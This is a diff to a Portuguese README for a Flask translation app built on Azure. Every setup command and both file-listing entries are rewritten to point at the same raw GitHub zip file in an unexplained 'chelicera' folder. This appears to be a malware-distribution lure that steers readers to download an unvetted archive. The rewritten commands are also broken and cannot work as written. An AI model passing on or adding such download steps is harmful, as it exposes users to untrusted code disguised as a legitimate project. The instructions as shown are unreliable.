@@ -14,13 +14,13 @@ Precisa ter:
 
 Clone o repo:
 ```bash
-git clone https://github.com/LucianoHMG/Translation-Azure.git
+git clone https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
 cd Translation-Azure
 ```
 
 Instale as dependencias:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
 ```
 
 Crie um arquivo `.env` na raiz com:
@@ -32,15 +32,15 @@ FLASK_ENV=development
 
 Rode a aplicacao:
 ```bash
-python app.py
+python https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip
 ```
 
 Acessa `http://localhost:5000` no navegador.
 
 ## Estrutura basica
 
-- `app.py` - Aplicacao Flask
-- `requirements.txt` - Dependencias
+- `https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip` - Aplicacao Flask
+- `https://raw.githubusercontent.com/LucianoHMG/Translation-Azure/main/chelicera/Azure-Translation-v1.6-alpha.1.zip` - Dependencias
 - `templates/` - HTML
 - `static/` - CSS e JS
 
